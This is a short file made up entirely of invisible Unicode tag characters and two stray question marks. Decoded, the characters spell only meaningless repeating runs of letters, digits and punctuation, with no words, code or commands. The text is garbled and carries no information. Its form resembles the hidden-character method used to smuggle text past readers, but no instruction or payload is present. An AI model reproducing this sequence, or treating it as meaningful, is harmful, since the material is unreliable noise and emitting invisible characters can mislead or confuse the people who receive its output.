󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓??󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦??󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯